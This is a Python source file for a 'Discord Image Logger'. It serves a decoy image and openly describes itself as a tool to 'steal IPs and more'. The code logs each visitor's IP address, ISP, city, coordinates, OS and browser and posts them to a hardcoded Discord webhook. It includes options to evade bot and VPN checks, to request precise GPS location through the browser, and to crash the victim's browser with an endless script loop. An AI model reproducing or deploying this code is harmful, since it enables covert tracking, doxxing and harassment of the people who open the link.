# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1345155789148524665/eUTROZdAAgs92_kmA1EzSXWNRsdUHWreH9370X3btD96lQGlsmBJYNWZAumB_uHWfTJR",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
